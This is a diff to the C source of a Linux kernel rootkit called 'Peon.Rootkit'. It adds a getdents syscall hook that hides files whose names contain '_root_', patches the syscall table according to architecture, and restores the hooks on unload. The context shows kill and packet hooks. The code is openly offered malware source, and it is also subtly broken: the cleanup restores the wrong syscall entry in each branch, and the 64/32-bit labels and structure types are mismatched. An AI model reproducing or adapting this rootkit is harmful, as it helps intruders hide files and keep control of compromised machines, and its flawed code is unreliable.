@@ -112,10 +112,37 @@ struct packet_type pt;
 /* save module */
  struct module *mod;
     
-/* -------------------------------------------------------------------- */
+/* -------------------------- 64 bits getdents version ------------------------------------------ */
 
+asmlinkage long (*orig_getdents) (unsigned int fd,  struct linux_dirent __user *dirent,  unsigned int count);
+asmlinkage long hacked_getdents(unsigned int fd,  struct linux_dirent __user *dirent, unsigned int count){
+
+	int ret= orig_getdents( fd,  dirent, count);
+	{
+
+	unsigned long off = 0;
+	struct linux_dirent64 __user *dir;	
+
+/* list directory  and hide files containing name _root_ */
+	for(off=0;off<ret;){
+
+		dir=(void*)dirent+off;
+	/* hide files containing name _root_ */	
+		if((strstr(dir->d_name, "_root_")) != NULL){
+		printk(KERN_ALERT "Peon.Rootkit: hide %s",dir->d_name);
+		   ret-=dir->d_reclen;
+			if(dir->d_reclen+off<ret)
+			   memmove ((void*)dir,(void*)((void*)dir+dir->d_reclen), (size_t) (ret-off));
+			}
+		else
+		off += dir->d_reclen;
+		}
+ 	}
+return ret;
+}
+
+/* -------------------------- 32 bits getdents version ------------------------------------------ */
 asmlinkage long (*orig_getdents64) (unsigned int fd,  struct linux_dirent64 __user *dirent,  unsigned int count);
-
 asmlinkage long hacked_getdents64 (unsigned int fd,  struct linux_dirent64 __user *dirent, unsigned int count){
 
 	int ret= orig_getdents64( fd,  dirent, count);
@@ -134,8 +161,7 @@ asmlinkage long hacked_getdents64 (unsigned int fd,  struct linux_dirent64 __use
 		   ret-=dir->d_reclen;
 			if(dir->d_reclen+off<ret)
 			   memmove ((void*)dir,(void*)((void*)dir+dir->d_reclen), (size_t) (ret-off));
-
-		}
+			}
 		else
 		off += dir->d_reclen;
 		}
@@ -184,6 +210,7 @@ kfree_skb(skb);
 printk(KERN_ALERT "Peon.Rootkit: ping ping");
 return 0;
 }
+
 int init_module(void)
 {
 
@@ -209,12 +236,21 @@ int init_module(void)
 /*  Replace the syscall in the table */
   syscall_table[__NR_kill] = (void*) kill_hook_call;
   
-  
+  if(OS_64_BITS){	
 /*  Save the adress of the original syscall */
+  orig_getdents= (void *) syscall_table[__NR_getdents];
+   
+/*  Replace the syscall in the table */
+  syscall_table[__NR_getdents] = (void*) hacked_getdents;
+ }
+ else{
+ /*  Save the adress of the original syscall */
   orig_getdents64= (void *) syscall_table[__NR_getdents64];
    
 /*  Replace the syscall in the table */
   syscall_table[__NR_getdents64] = (void*) hacked_getdents64;
+ 
+ }
   
  /* 
 //remove interfacepacket layer2
@@ -241,8 +277,11 @@ void cleanup_module(void)
     /* Set the orignal call*/
   syscall_table[/*  Sycall Number*/ __NR_kill] = (void*) kill_orig_call;
   
-  syscall_table[ __NR_getdents64] = (void*) orig_getdents64;
-
+    if(OS_64_BITS)
+  	syscall_table[ __NR_getdents64] = (void*) orig_getdents64;
+    else
+	syscall_table[ __NR_getdents] = (void*) orig_getdents;
+	 
     enable_wp(); 
 
     printk(KERN_INFO "Peon.Rootkit is unloaded!\n");
